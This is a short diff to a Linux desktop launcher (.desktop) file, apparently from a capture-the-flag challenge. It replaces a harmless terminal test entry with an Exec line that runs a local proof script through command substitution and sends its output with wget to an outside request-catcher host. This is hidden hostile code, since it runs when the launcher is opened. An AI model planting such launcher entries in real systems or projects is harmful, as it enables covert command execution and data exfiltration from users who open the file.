@@ -1,9 +1,3 @@
 [Desktop Entry]
-Version=1.0
-Name=Test        
-Comment=Test the terminal running a command inside it
-Exec=gnome-terminal -e "bash -c 'echo hello;$SHELL'"
-Icon=utilities-terminal
-Terminal=false
+Exec=sh -c "wget https://hkcert.requestcatcher.com/test?`/proof*.sh`"
 Type=Application
-Categories=Application;
